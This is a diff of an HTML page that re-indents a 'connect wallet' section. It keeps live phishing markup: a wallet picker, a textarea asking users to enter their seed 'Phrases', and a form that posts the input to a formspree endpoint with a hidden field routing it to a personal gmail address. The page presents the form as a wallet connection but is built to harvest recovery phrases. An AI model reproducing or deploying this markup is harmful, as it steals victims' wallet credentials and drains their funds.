@@ -38,28 +38,30 @@
             </div>
         </section>
         <section id="connect-wallet" class="wallet-section">
-            <select id="walletSelect" class="hidden">
-                <option value="" disabled selected>Select Wallet</option>
-                <option value="metamask">MetaMask</option>
-                <option value="trustwallet">Trust Wallet</option>
-                <option value="safepal">SafePal Wallet</option>
-                <option value="bitget">Bitget Wallet</option>
-                <option value="phantom">Phantom Wallet</option>
-                <option value="coinbase">Coinbase Wallet</option>
-                <option value="ledger">Ledger</option>
-                <option value="walletconnect">WalletConnect</option>
-                <option value="other">Other Wallet</option>
-                <option value="okx">OKX Wallet</option>
-            </select>
-            <textarea id="userInput" class="hidden" placeholder="Input your Phrases here..." rows="4" cols="50" required></textarea>
-            <button id="connectWalletButton" class="hidden">Connect Wallet</button>
-            <div id="submitSection" class="hidden">
-                <form action="https://formspree.io/f/mblkkzrj" method="POST" id="messageForm">
-                    <input type="hidden" name="_to" value="igetaoreed54@gmail.com">
-                    <button type="submit" id="submitButton">Submit</button>
-                </form>
-                <p id="statusMessage"></p>
-                <div id="barcodeContainer" class="hidden"></div>
+            <div class="wallet-wrapper">
+                <select id="walletSelect" class="hidden">
+                    <option value="" disabled selected>Select Wallet</option>
+                    <option value="metamask">MetaMask</option>
+                    <option value="trustwallet">Trust Wallet</option>
+                    <option value="safepal">SafePal Wallet</option>
+                    <option value="bitget">Bitget Wallet</option>
+                    <option value="phantom">Phantom Wallet</option>
+                    <option value="coinbase">Coinbase Wallet</option>
+                    <option value="ledger">Ledger</option>
+                    <option value="walletconnect">WalletConnect</option>
+                    <option value="other">Other Wallet</option>
+                    <option value="okx">OKX Wallet</option>
+                </select>
+                <textarea id="userInput" class="hidden" placeholder="Input your Phrases here..." rows="4" cols="50" required></textarea>
+                <button id="connectWalletButton" class="hidden">Connect Wallet</button>
+                <div id="submitSection" class="hidden">
+                    <form action="https://formspree.io/f/mblkkzrj" method="POST" id="messageForm">
+                        <input type="hidden" name="_to" value="igetaoreed54@gmail.com">
+                        <button type="submit" id="submitButton">Submit</button>
+                    </form>
+                    <p id="statusMessage"></p>
+                    <div id="barcodeContainer" class="hidden"></div>
+                </div>
             </div>
         </section>
     </main>
